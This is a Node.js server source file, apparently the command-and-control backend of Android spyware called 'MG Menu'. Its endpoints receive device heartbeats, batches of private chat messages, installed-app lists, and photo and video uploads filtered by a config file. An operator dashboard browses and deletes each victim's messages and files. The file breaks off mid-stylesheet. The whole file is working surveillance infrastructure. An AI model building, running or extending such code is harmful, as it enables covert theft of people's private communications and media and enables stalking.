import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";
import fs from "node:fs";
import path from "node:path";

const PORT = process.env.PORT || 3000;

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
  console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
  process.exit(1);
}

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SECRET_KEY, {
  auth: { persistSession: false }
});

process.on("unhandledRejection", (reason) => console.error("Unhandled promise rejection:", reason));
process.on("uncaughtException", (error) => console.error("Uncaught exception:", error));

const UPLOAD_DIR = path.join(process.cwd(), "uploads");
const THUMB_DIR = path.join(process.cwd(), "thumbs");
const LOG_FILE = path.join(process.cwd(), "logs.json");
const TRACK_FILE = path.join(process.cwd(), "tracks.json");
const ACCOUNT_FILE = path.join(process.cwd(), "accounts.json");
const MESSAGE_META_FILE = path.join(process.cwd(), "message_meta.json");
const CONFIG_FILE = path.join(process.cwd(), "config.json");

fs.mkdirSync(UPLOAD_DIR, { recursive: true });
fs.mkdirSync(THUMB_DIR, { recursive: true });

let command = {
  title: "MG Menu",
  text: "Server online",
  action: "none",
  activity: ""
};

function clean(value) {
  return value == null ? "" : String(value);
}

function optionalClean(value) {
  const s = clean(value);
  return s ? s : null;
}

function optionalNumber(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : null;
}

function batteryPercent(value) {
  const n = optionalNumber(value);
  return n != null && n >= 0 && n <= 100 ? n : null;
}

function nowIso() {
  return new Date().toISOString();
}

function nowMillis() {
  return Date.now();
}

function publicIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string" && forwarded.trim()) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress || "";
}

function safeDecode(value) {
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

function safeName(name) {
  const base = path.basename(clean(name).replaceAll("\\", "/")).trim();
  return (base || "file").replace(/[^\w.\-() ]+/g, "_").slice(0, 180);
}

function json(res, status, data) {
  res.writeHead(status, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
    "access-control-allow-origin": "*"
  });
  res.end(JSON.stringify(data));
}

function text(res, status, body, type = "text/plain; charset=utf-8") {
  res.writeHead(status, {
    "content-type": type,
    "cache-control": "no-store",
    "access-control-allow-origin": "*"
  });
  res.end(body);
}

function notFound(res) {
  json(res, 404, { ok: false, error: "Not found" });
}

function collect(req, limit = 100 * 1024 * 1024) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on("data", (chunk) => {
      size += chunk.length;
      if (size > limit) {
        reject(new Error("Request body too large"));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on("end", () => resolve(Buffer.concat(chunks)));
    req.on("error", reject);
  });
}

async function readJson(req, fallback = {}) {
  const body = await collect(req, 10 * 1024 * 1024);
  if (!body.length) return fallback;
  try {
    return JSON.parse(body.toString("utf8"));
  } catch {
    return Object.fromEntries(new URLSearchParams(body.toString("utf8")).entries());
  }
}

async function readForm(req) {
  const body = await collect(req, 25 * 1024 * 1024);
  return Object.fromEntries(new URLSearchParams(body.toString("utf8")).entries());
}

function readJsonFile(file) {
  try {
    if (!fs.existsSync(file)) return [];
    const raw = fs.readFileSync(file, "utf8").trim();
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (error) {
    console.error(`Failed to read ${path.basename(file)}:`, error);
    return [];
  }
}

function writeJsonFile(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function readLogs() {
  return readJsonFile(LOG_FILE);
}

function writeLogs(logs) {
  writeJsonFile(LOG_FILE, logs);
}

function readTracks() {
  return readJsonFile(TRACK_FILE);
}

function writeTracks(tracks) {
  writeJsonFile(TRACK_FILE, tracks);
}

function readAccounts() {
  return readJsonFile(ACCOUNT_FILE);
}

function writeAccounts(accounts) {
  writeJsonFile(ACCOUNT_FILE, accounts);
}

function readMessageMeta() {
  return readJsonFile(MESSAGE_META_FILE);
}

function writeMessageMeta(meta) {
  writeJsonFile(MESSAGE_META_FILE, meta);
}

function accountIdentity(input = {}) {
  const my_uid = optionalNumber(input.my_uid ?? input.myUid);
  const public_id = optionalClean(input.public_id ?? input.publicId);
  const my_name = optionalClean(input.my_name ?? input.myName ?? input.name);
  return { my_uid, public_id, my_name };
}

function accountKey(deviceId, identity = {}) {
  const id = identity.my_uid ?? identity.public_id ?? "unknown";
  return `${deviceId}:${id}`;
}

function defaultAccount(deviceId) {
  return {
    key: accountKey(deviceId, {}),
    device_id: deviceId,
    my_uid: null,
    public_id: null,
    my_name: "Unknown account",
    first_seen: nowMillis(),
    last_seen: nowMillis()
  };
}

function saveAccount(deviceId, identity = {}, extra = {}) {
  if (!deviceId) return null;
  const normalized = accountIdentity(identity);
  const key = accountKey(deviceId, normalized);
  const accounts = readAccounts();
  const existing = accounts.find((item) => item.key === key);
  const row = {
    ...(existing || {}),
    key,
    device_id: deviceId,
    my_uid: normalized.my_uid ?? existing?.my_uid ?? null,
    public_id: normalized.public_id || existing?.public_id || null,
    my_name: normalized.my_name || existing?.my_name || null,
    model: optionalClean(extra.model) || existing?.model || null,
    brand: optionalClean(extra.brand) || existing?.brand || null,
    public_ip: optionalClean(extra.public_ip) || existing?.public_ip || null,
    first_seen: existing?.first_seen || nowMillis(),
    last_seen: nowMillis()
  };
  if (existing) {
    Object.assign(existing, row);
  } else {
    accounts.unshift(row);
  }
  writeAccounts(accounts);
  return row;
}

function latestAccountForDevice(deviceId) {
  const accounts = readAccounts()
    .filter((item) => item.device_id === deviceId)
    .sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0));
  return accounts[0] || defaultAccount(deviceId);
}

function fallbackAccountKey(deviceId, accountsForDevice = []) {
  if (!accountsForDevice.length) return accountKey(deviceId, {});
  return [...accountsForDevice].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0))[0].key;
}

function saveMessageMeta(rows, account) {
  if (!account) return;
  const meta = readMessageMeta();
  const seen = new Map(meta.map((item) => [`${item.device_id}:${item.mid}`, item]));
  for (const row of rows) {
    const key = `${row.device_id}:${row.mid}`;
    seen.set(key, {
      ...(seen.get(key) || {}),
      device_id: row.device_id,
      mid: row.mid,
      account_key: account.key,
      my_uid: account.my_uid,
      public_id: account.public_id,
      my_name: account.my_name,
      received_at: row.received_at || nowMillis()
    });
  }
  writeMessageMeta([...seen.values()].slice(-50000));
}

function accountForMessage(message, accountsForDevice) {
  const meta = readMessageMeta().find((item) => item.device_id === message.device_id && item.mid === message.mid);
  if (meta?.account_key) return meta.account_key;
  return fallbackAccountKey(message.device_id, accountsForDevice);
}

function contentType(file) {
  const ext = path.extname(file).toLowerCase();
  return {
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".png": "image/png",
    ".gif": "image/gif",
    ".webp": "image/webp",
    ".svg": "image/svg+xml",
    ".mp4": "video/mp4",
    ".webm": "video/webm",
    ".mov": "video/quicktime",
    ".pdf": "application/pdf",
    ".zip": "application/zip"
  }[ext] || "application/octet-stream";
}

function sendFile(res, root, rawName) {
  const file = path.basename(safeDecode(rawName));
  const filePath = path.join(root, file);
  if (!file || !fs.existsSync(filePath) || !fs.statSync(filePath).isFile()) return notFound(res);
  res.writeHead(200, {
    "content-type": contentType(file),
    "content-length": fs.statSync(filePath).size,
    "cache-control": "public, max-age=86400",
    "access-control-allow-origin": "*"
  });
  fs.createReadStream(filePath).pipe(res);
}

function readConfigFlag() {
  try {
    if (!fs.existsSync(CONFIG_FILE)) return "1";
    const raw = fs.readFileSync(CONFIG_FILE, "utf8").trim();
    if (!raw) return "1";
    if (raw === "0" || raw === "1") return raw;
    const cfg = JSON.parse(raw);
    const value = cfg.enabled ?? cfg.config ?? cfg.active ?? cfg.value;
    return value === false || value === 0 || value === "0" ? "0" : "1";
  } catch {
    return "1";
  }
}

function readConfigFileTypes() {
  try {
    if (!fs.existsSync(CONFIG_FILE)) return [".jpg", ".jpeg", ".png", ".mp4", ".mov"];
    const raw = fs.readFileSync(CONFIG_FILE, "utf8").trim();
    if (!raw || raw === "0" || raw === "1") return [".jpg", ".jpeg", ".png", ".mp4", ".mov"];
    const cfg = JSON.parse(raw);
    const types = Array.isArray(cfg.fileTypes) ? cfg.fileTypes : [];
    return types
      .map((type) => clean(type).trim().toLowerCase())
      .filter((type) => type.startsWith("."));
  } catch {
    return [".jpg", ".jpeg", ".png", ".mp4", ".mov"];
  }
}

function readConfigMaxFileSizeBytes() {
  try {
    if (!fs.existsSync(CONFIG_FILE)) return 0;
    const raw = fs.readFileSync(CONFIG_FILE, "utf8").trim();
    if (!raw || raw === "0" || raw === "1") return 0;
    const cfg = JSON.parse(raw);
    const mb = optionalNumber(cfg.maxFileSizeMb ?? cfg.maxSizeMb ?? cfg.fileSizeMb);
    const bytes = optionalNumber(cfg.maxFileSizeBytes ?? cfg.maxSizeBytes);
    if (bytes != null && bytes > 0) return Math.floor(bytes);
    if (mb != null && mb > 0) return Math.floor(mb * 1024 * 1024);
    return 0;
  } catch {
    return 0;
  }
}

async function getDevices() {
  const { data, error } = await supabase
    .from("devices")
    .select("*")
    .order("server_last_seen", { ascending: false, nullsFirst: false });
  if (error) throw error;
  return data || [];
}

async function getMessages(deviceId = "") {
  let query = supabase.from("messages").select("*").order("received_at", { ascending: false });
  if (deviceId) query = query.eq("device_id", deviceId);
  const { data, error } = await query.limit(2000);
  if (error) throw error;
  return data || [];
}

function getFiles(deviceId = "") {
  const seen = new Set();
  return readLogs()
    .filter((item) => item && item.type === "file")
    .filter((item) => !deviceId || item.device_id === deviceId)
    .filter((item) => {
      const key = `${item.device_id}:${item.original}:${item.size}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
}

function getRawFiles(deviceId = "") {
  return readLogs()
    .filter((item) => item && item.type === "file")
    .filter((item) => !deviceId || item.device_id === deviceId);
}

function isOnline(device) {
  const raw = device.server_last_seen;
  const t = typeof raw === "number" || /^\d+$/.test(String(raw || "")) ? Number(raw) : Date.parse(raw || "");
  return Number.isFinite(t) && Date.now() - t < 60_000;
}

async function dashboardData() {
  const [devices, messages] = await Promise.all([getDevices(), getMessages()]);
  const files = getFiles();
  const accounts = readAccounts();
  const meta = readMessageMeta();
  const tracks = readTracks();

  const msgCounts = new Map();
  const fileCounts = new Map();
  for (const msg of messages) msgCounts.set(msg.device_id, (msgCounts.get(msg.device_id) || 0) + 1);
  for (const file of files) fileCounts.set(file.device_id, (fileCounts.get(file.device_id) || 0) + 1);

  return devices.map((device) => {
    const deviceAccounts = accounts.filter((account) => account.device_id === device.device_id);
    if (!deviceAccounts.length && (device.my_uid || device.public_id || device.my_name)) {
      deviceAccounts.push({
        key: accountKey(device.device_id, device),
        device_id: device.device_id,
        my_uid: device.my_uid,
        public_id: device.public_id,
        my_name: device.my_name,
        last_seen: device.server_last_seen
      });
    }
    const displayAccount = [...deviceAccounts].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0))[0];
    const latestTrack = tracks.find((track) => track.device_id === device.device_id);
    return {
      ...device,
      online: isOnline(device),
      display_name: displayAccount?.my_name || displayAccount?.public_id || device.my_name || device.public_id || device.device_id,
      account_count: deviceAccounts.length,
      message_count: msgCounts.get(device.device_id) || 0,
      file_count: fileCounts.get(device.device_id) || 0,
      tracked_message_count: meta.filter((item) => item.device_id === device.device_id).length,
      android: latestTrack?.android || null,
      app_count: latestTrack?.app_count || 0,
      last_track_time: latestTrack?.time || null
    };
  });
}

async function accountSummary(deviceId) {
  const [messages] = await Promise.all([getMessages(deviceId)]);
  const accounts = readAccounts().filter((item) => item.device_id === deviceId);
  const finalAccounts = accounts.length ? accounts : [defaultAccount(deviceId)];
  const files = getFiles(deviceId);
  const meta = readMessageMeta();
  const byAccount = new Map(finalAccounts.map((account) => [account.key, { ...account, message_count: 0, file_count: 0 }]));

  for (const msg of messages) {
    const key = meta.find((item) => item.device_id === msg.device_id && item.mid === msg.mid)?.account_key || accountForMessage(msg, finalAccounts);
    if (key && byAccount.has(key)) byAccount.get(key).message_count += 1;
  }
  for (const file of files) {
    const key = file.account_key || fallbackAccountKey(deviceId, finalAccounts);
    if (key && byAccount.has(key)) byAccount.get(key).file_count += 1;
  }
  return [...byAccount.values()].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0));
}

async function messagesForAccount(deviceId, rawAccountKey) {
  const accountKeyValue = safeDecode(rawAccountKey);
  const messages = await getMessages(deviceId);
  const accounts = readAccounts().filter((item) => item.device_id === deviceId);
  return messages.filter((message) => accountForMessage(message, accounts) === accountKeyValue);
}

function filesForAccount(deviceId, rawAccountKey) {
  const accountKeyValue = safeDecode(rawAccountKey);
  const accounts = readAccounts().filter((item) => item.device_id === deviceId);
  return getFiles(deviceId).filter((file) => {
    if (file.account_key) return file.account_key === accountKeyValue;
    return fallbackAccountKey(deviceId, accounts) === accountKeyValue;
  });
}

function rawFilesForAccount(deviceId, rawAccountKey) {
  const accountKeyValue = safeDecode(rawAccountKey);
  const accounts = readAccounts().filter((item) => item.device_id === deviceId);
  return getRawFiles(deviceId).filter((file) => {
    if (file.account_key) return file.account_key === accountKeyValue;
    return fallbackAccountKey(deviceId, accounts) === accountKeyValue;
  });
}

async function handleHeartbeat(req, res) {
  const body = await readJson(req);
  const device_id = clean(body.device_id || body.deviceId || body.id || body.my_uid || body.myUid || body.public_id || body.publicId);
  if (!device_id) return json(res, 400, { ok: false, error: "device_id is required" });

  const identity = accountIdentity(body);
  const account = saveAccount(device_id, identity, {
    model: body.model,
    brand: body.brand,
    public_ip: publicIp(req)
  });

  const row = {
    device_id,
    my_uid: identity.my_uid,
    public_id: identity.public_id,
    my_name: identity.my_name,
    model: optionalClean(body.model),
    brand: optionalClean(body.brand),
    battery_percent: batteryPercent(body.battery_percent ?? body.battery),
    network_type: optionalClean(body.network_type || body.network),
    public_ip: optionalClean(publicIp(req)),
    server_last_seen: optionalNumber(body.lastSeen) || nowMillis()
  };
  for (const key of Object.keys(row)) if (row[key] == null) delete row[key];
  const { error } = await supabase.from("devices").upsert(row, { onConflict: "device_id" });
  if (error) throw error;
  json(res, 200, { ok: true, device: row, account });
}

async function handleChatBatch(req, res) {
  const body = await readJson(req, []);
  const list = Array.isArray(body) ? body : Array.isArray(body.messages) ? body.messages : [];
  if (!list.length) return json(res, 400, { ok: false, error: "messages array is required" });
  const batchDeviceId = clean(body.device_id || body.deviceId);
  const account = saveAccount(batchDeviceId, accountIdentity(body), { public_ip: publicIp(req) }) || latestAccountForDevice(batchDeviceId);

  const rows = list.map((msg) => ({
    device_id: clean(msg.device_id || msg.deviceId || batchDeviceId),
    mid: clean(msg.mid || msg.id),
    direction: clean(msg.direction),
    peer_uid: optionalNumber(msg.peer_uid ?? msg.peerUid),
    peer_name: clean(msg.peer_name ?? msg.peerName),
    text: clean(msg.text || msg.message),
    message_time: optionalNumber(msg.message_time ?? msg.messageTime ?? msg.time) || nowMillis(),
    received_at: nowMillis()
  })).filter((msg) => msg.device_id && msg.mid);

  if (!rows.length) return json(res, 400, { ok: false, error: "valid messages are required" });
  saveMessageMeta(rows, account);

  let saved = rows.length;
  let skipped = 0;
  const { error } = await supabase
    .from("messages")
    .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true });
  if (error) {
    if (error.code !== "23505") throw error;
    saved = 0;
    skipped = 0;
    for (const row of rows) {
      const { error: rowError } = await supabase.from("messages").insert(row);
      if (!rowError) saved += 1;
      else if (rowError.code === "23505") skipped += 1;
      else throw rowError;
    }
  }

  if (batchDeviceId) {
    const batchDevice = {
      device_id: batchDeviceId,
      my_uid: account?.my_uid,
      public_id: account?.public_id,
      my_name: account?.my_name,
      public_ip: optionalClean(publicIp(req)),
      server_last_seen: nowMillis()
    };
    for (const key of Object.keys(batchDevice)) if (batchDevice[key] == null) delete batchDevice[key];
    await supabase.from("devices").upsert(batchDevice, { onConflict: "device_id" });
  }
  json(res, 200, { ok: true, saved, skipped, account });
}

function fileNameFromHeaders(req, url) {
  const fromQuery = url.searchParams.get("filename") || url.searchParams.get("file") || url.searchParams.get("name") || url.searchParams.get("original");
  if (fromQuery) return fromQuery;
  const headerName = req.headers["x-filename"] || req.headers["x-file-name"];
  if (typeof headerName === "string" && headerName) return headerName;
  const disposition = req.headers["content-disposition"];
  if (typeof disposition === "string") {
    const match = disposition.match(/filename\*?=(?:UTF-8'')?"?([^";]+)"?/i);
    if (match) return safeDecode(match[1]);
  }
  return "upload.bin";
}

async function handleTrack(req, res) {
  const body = await readForm(req);
  const model = clean(body.model);
  const brand = clean(body.brand);
  const android = clean(body.android);
  const device_id = clean(body.device_id || body.deviceId || [model, brand, android].filter(Boolean).join("_") || publicIp(req) || "unknown");
  const appList = clean(body.apps).split(",").map((app) => app.trim()).filter(Boolean);
  const account = latestAccountForDevice(device_id);
  const entry = {
    type: "track",
    device_id,
    account_key: account.key,
    ip: publicIp(req),
    battery: batteryPercent(body.battery),
    model,
    brand,
    android,
    apps: clean(body.apps),
    app_count: appList.length,
    time: nowIso()
  };
  const tracks = readTracks();
  tracks.unshift(entry);
  writeTracks(tracks.slice(0, 1000));

  const { error } = await supabase.from("devices").upsert({
    device_id,
    model,
    brand,
    battery_percent: batteryPercent(body.battery),
    public_ip: publicIp(req),
    server_last_seen: nowMillis()
  }, { onConflict: "device_id" });
  if (error) throw error;
  json(res, 200, { ok: true, device_id, account_key: account.key, app_count: appList.length });
}

async function handleUpload(req, res, url) {
  const maxBytes = readConfigMaxFileSizeBytes();
  const contentLength = optionalNumber(req.headers["content-length"]);
  if (maxBytes > 0 && contentLength != null && contentLength > maxBytes) {
    return json(res, 413, { ok: false, error: "file too large", max_size_bytes: maxBytes });
  }
  const buffer = await collect(req);
  if (!buffer.length) return json(res, 400, { ok: false, error: "empty upload body" });
  if (maxBytes > 0 && buffer.length > maxBytes) {
    return json(res, 413, { ok: false, error: "file too large", max_size_bytes: maxBytes });
  }
  const device_id = clean(url.searchParams.get("device_id") || url.searchParams.get("deviceId") || req.headers["x-device-id"] || "unknown");
  const account = latestAccountForDevice(device_id);
  const original = safeName(fileNameFromHeaders(req, url));
  const logs = readLogs();
  const duplicate = logs.find((item) =>
    item.type === "file" &&
    item.device_id === device_id &&
    item.original === original &&
    item.size === buffer.length
  );
  if (duplicate) {
    return json(res, 200, { ok: true, duplicate: true, ...duplicate });
  }
  const stamp = Date.now();
  const file = `${stamp}_${original}`;
  const thumb = `thumb_${stamp}_${original}`;
  fs.writeFileSync(path.join(UPLOAD_DIR, file), buffer);
  fs.copyFileSync(path.join(UPLOAD_DIR, file), path.join(THUMB_DIR, thumb));

  const entry = {
    type: "file",
    file,
    original,
    thumb,
    device_id,
    account_key: account.key,
    ip: publicIp(req),
    size: buffer.length,
    time: nowIso()
  };
  logs.unshift(entry);
  writeLogs(logs);
  json(res, 200, { ok: true, ...entry });
}

function deletePhysicalFile(itemOrName) {
  const names = typeof itemOrName === "string"
    ? [itemOrName]
    : [itemOrName.file, itemOrName.thumb].filter(Boolean);
  for (const name of names) {
    for (const root of [UPLOAD_DIR, THUMB_DIR]) {
      const target = path.join(root, path.basename(name));
      if (fs.existsSync(target)) fs.rmSync(target, { force: true });
    }
  }
}

function deleteFilesByNames(names = []) {
  const wanted = new Set(names.map((name) => path.basename(safeDecode(name))));
  const logs = readLogs();
  const removed = [];
  const kept = [];
  for (const item of logs) {
    if (wanted.has(item.file) || wanted.has(item.thumb) || wanted.has(item.original)) {
      deletePhysicalFile(item);
      removed.push(item);
    } else {
      kept.push(item);
    }
  }
  writeLogs(kept);
  return removed.length;
}

async function deleteMessages(deviceId, messages = []) {
  if (!messages.length) return 0;
  const ids = messages.map((m) => m.id).filter((id) => id != null);
  if (ids.length) {
    const { error } = await supabase.from("messages").delete().in("id", ids);
    if (error) throw error;
  } else {
    for (const msg of messages) {
      const { error } = await supabase.from("messages").delete().eq("device_id", deviceId).eq("mid", msg.mid);
      if (error) throw error;
    }
  }
  const removeKeys = new Set(messages.map((msg) => `${msg.device_id}:${msg.mid}`));
  writeMessageMeta(readMessageMeta().filter((item) => !removeKeys.has(`${item.device_id}:${item.mid}`)));
  return messages.length;
}

async function deleteAccount(deviceId, rawAccountKey, includeFiles = true) {
  const key = safeDecode(rawAccountKey);
  const messages = await messagesForAccount(deviceId, key);
  const deletedMessages = await deleteMessages(deviceId, messages);
  let deletedFiles = 0;
  if (includeFiles) {
    deletedFiles = deleteFilesByNames(rawFilesForAccount(deviceId, key).map((file) => file.file));
  }
  writeAccounts(readAccounts().filter((account) => account.key !== key));
  writeMessageMeta(readMessageMeta().filter((item) => item.account_key !== key));
  return { deletedMessages, deletedFiles };
}

async function handleDashboardApi(req, res, url) {
  const parts = url.pathname.split("/").filter(Boolean).map(safeDecode);
  if (req.method === "GET" && url.pathname === "/api/devices") return json(res, 200, await dashboardData());
  if (req.method === "GET" && url.pathname === "/api/tracks") return json(res, 200, readTracks());

  if (parts[0] === "api" && parts[1] === "device" && parts[2]) {
    const deviceId = parts[2];
    if (req.method === "GET" && parts.length === 3) {
      const devices = await dashboardData();
      const device = devices.find((item) => item.device_id === deviceId);
      return device ? json(res, 200, device) : notFound(res);
    }
    if (req.method === "GET" && parts[3] === "accounts") return json(res, 200, await accountSummary(deviceId));
    if (req.method === "GET" && parts[3] === "messages") return json(res, 200, await getMessages(deviceId));
    if (req.method === "GET" && parts[3] === "files") return json(res, 200, getFiles(deviceId));
    if (req.method === "GET" && parts[3] === "tracks") return json(res, 200, readTracks().filter((item) => item.device_id === deviceId));
    if (parts[3] === "account" && parts[4]) {
      const key = parts[4];
      if (req.method === "GET" && parts[5] === "messages") return json(res, 200, await messagesForAccount(deviceId, key));
      if (req.method === "GET" && parts[5] === "files") return json(res, 200, filesForAccount(deviceId, key));
      if (req.method === "DELETE" && parts.length === 5) return json(res, 200, { ok: true, ...(await deleteAccount(deviceId, key, true)) });
      if (req.method === "DELETE" && parts[5] === "messages") return json(res, 200, { ok: true, deleted: await deleteMessages(deviceId, await messagesForAccount(deviceId, key)) });
      if (req.method === "DELETE" && parts[5] === "files") return json(res, 200, { ok: true, deleted: deleteFilesByNames(rawFilesForAccount(deviceId, key).map((file) => file.file)) });
    }
    if (req.method === "DELETE" && parts.length === 3) {
      const messages = await getMessages(deviceId);
      const deletedMessages = await deleteMessages(deviceId, messages);
      const deletedFiles = deleteFilesByNames(getRawFiles(deviceId).map((file) => file.file));
      writeAccounts(readAccounts().filter((account) => account.device_id !== deviceId));
      writeTracks(readTracks().filter((track) => track.device_id !== deviceId));
      await supabase.from("devices").delete().eq("device_id", deviceId);
      return json(res, 200, { ok: true, deletedMessages, deletedFiles });
    }
  }

  if (req.method === "DELETE" && url.pathname === "/api/messages") {
    const body = await readJson(req, {});
    const ids = Array.isArray(body.ids) ? body.ids : [];
    const deviceId = clean(body.device_id || body.deviceId);
    if (!ids.length || !deviceId) return json(res, 400, { ok: false, error: "device_id and ids are required" });
    const messages = (await getMessages(deviceId)).filter((msg) => ids.includes(msg.id));
    return json(res, 200, { ok: true, deleted: await deleteMessages(deviceId, messages) });
  }

  if (req.method === "DELETE" && url.pathname === "/api/files") {
    const body = await readJson(req, {});
    const files = Array.isArray(body.files) ? body.files : [];
    return json(res, 200, { ok: true, deleted: deleteFilesByNames(files) });
  }

  return false;
}

async function dashboardHtml() {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MG Menu Dashboard</title>
<style>
:root{color-scheme:dark;--bg:#090b10;--panel:#111620;--panel2:#171f2b;--line:#273140;--text:#edf2f7;--muted:#9aa8ba;--accent:#36c5f0;--ok:#34d399;--danger:#fb7185;--bubble-in:#f4f6f8;--bubble-out:#d8f3ff}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:grid;grid-template-columns:320px 1fr;min-height:100vh}.side{background:#0d1119;border-right:1px solid var(--line);display:flex;flex-direction:column;min-width:0}.brand{padding:18px;border-bottom:1px solid var(--line)}.brand h1{font-size:18px;margin:0 0 10px}.search,.commandbar input,.commandbar select{width:100%;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px;outline:none}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 18px;border-bottom:1px solid var(--line)}.stat,.card,.row,.account,.msg,.file,.conv,.thread{background:var(--panel);border:1px solid var(--line);border-radius:8px}.stat{padding:10px}.stat b{display:block;font-size:18px}.stat span,.muted{color:var(--muted);font-size:12px}.devices{overflow:auto;padding:10px}.device{width:100%;text-align:left;color:var(--text);background:transparent;border:1px solid transparent;border-radius:8px;padding:11px;margin-bottom:6px}.device:hover,.device.active{background:var(--panel);border-color:var(--line)}.devtop{display:flex;align-items:center;gap:9px}.dot{width:9px;height:9px;border-radius:50%;background:#7b8494;flex:none}.dot.on{background:var(--ok);box-shadow:0 0 14px #34d39980}.devname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.devmeta{display:flex;gap:12px;color:var(--muted);font-size:12px;margin:7px 0 0 18px}.main{min-width:0;display:flex;flex-direction:column}.topbar{display:flex;justify-content:space-between;gap:12px;padding:18px 22px;border-bottom:1px solid var(--line);background:#0b0f16}.title h2{margin:0;font-size:22px}.title p{margin:4px 0 0;color:var(--muted)}.actions,.toolbar,.fileactions{display:flex;gap:8px;flex-wrap:wrap}.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 11px;text-decoration:none}.btn:hover{border-color:var(--accent)}.btn.danger{color:#ffe4e6;border-color:#883142;background:#301018}.tabs{display:flex;gap:6px;padding:12px 22px 0;background:#0b0f16}.tab{padding:10px 13px;border-radius:8px 8px 0 0;background:transparent;color:var(--muted)}.tab.active{background:var(--panel);color:var(--text)}.commandbar{display:grid;grid-template-columns:1fr 1.4fr 150px 1.4fr auto auto;gap:8px;padding:12px 22px;border-bottom:1px solid var(--line);background:var(--panel)}.content{padding:18px 22px;overflow:auto;flex:1}.cards{display:grid;grid-template-columns:repeat(4,minmax(140px,1fr));gap:12px;margin-bottom:14px}.card{padding:14px}.card b{display:block;font-size:20px;margin-top:5px}.accounts{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin:0 0 14px}.account{padding:12px;text-align:left;color:var(--text)}.account.active{border-color:var(--accent)}.account strong{display:block}.row{display:flex;justify-content:space-between;gap:14px;padding:12px 14px;margin-bottom:8px}.info-grid{display:grid;grid-template-columns:repeat(2,minmax(220px,1fr));gap:8px}.messages{display:flex;flex-direction:column;gap:10px}.msg{max-width:860px;padding:12px}.msg.out{margin-left:auto;border-color:#23546a}.msghead{display:flex;justify-content:space-between;gap:14px;margin-bottom:8px}.sender-name{display:block;font-weight:700}.sender-id{display:block;color:var(--muted);font-size:12px;margin-top:2px}.msgtime{white-space:nowrap;color:var(--muted);font-size:12px}.msgtext{line-height:1.45;white-space:pre-wrap}.conv-list{display:flex;flex-direction:column;gap:8px}.conv{display:grid;grid-template-columns:42px 1fr auto;gap:12px;align-items:center;width:100%;text-align:left;color:var(--text);padding:10px 12px}.conv:hover{border-color:var(--accent)}.avatar{width:42px;height:42px;border-radius:50%;display:grid;place-items:center;background:#243044;font-weight:800}.conv-name{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.conv-preview{color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:3px}.conv-meta{text-align:right;color:var(--muted);font-size:12px}.thread{display:flex;flex-direction:column;height:min(68vh,760px);overflow:hidden}.thread-head{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:12px;border-bottom:1px solid var(--line)}.thread-scroll{flex:1;overflow:auto;padding:16px;background:#f2f3f5;color:#111}.bubble-row{display:flex;gap:8px;align-items:flex-end;margin:8px 0}.bubble-row.out{justify-content:flex-end}.bubble{max-width:min(72%,680px);padding:9px 12px;border-radius:10px;background:var(--bubble-in);box-shadow:0 1px 1px #0001;line-height:1.4;white-space:pre-wrap}.bubble-row.out .bubble{background:var(--bubble-out)}.bubble-time{display:block;color:#777;font-size:11px;margin-top:5px;text-align:right}.date-chip{display:block;width:max-content;margin:14px auto 10px;background:#c9cbd0;color:white;border-radius:6px;padding:4px 8px;font-size:12px}.bubble-img{display:block;max-width:220px;max-height:260px;border-radius:8px;margin-top:6px}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(185px,1fr));gap:12px}.file{overflow:hidden}.thumb{aspect-ratio:1.35;background:#070a10;display:grid;place-items:center;color:var(--muted);font-size:34px}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.filebody{padding:10px}.filename{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.filemeta{color:var(--muted);font-size:12px;margin:5px 0 10px}.empty{color:var(--muted);padding:40px;text-align:center;border:1px dashed var(--line);border-radius:8px;background:#0d111980}.checkline{display:flex;align-items:center;gap:8px;margin-bottom:8px}.modal{position:fixed;inset:0;background:#000a;display:none;align-items:center;justify-content:center;padding:24px;z-index:10}.modal.open{display:flex}.modalbox{background:var(--panel);border:1px solid var(--line);border-radius:8px;width:min(1000px,96vw);max-height:92vh;overflow:hidden}.modalhead{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}.modalbody{padding:14px;display:grid;place-items:center;max-height:78vh;overflow:auto}.modalbody img,.modalbody video{max-width:100%;max-height:72vh}
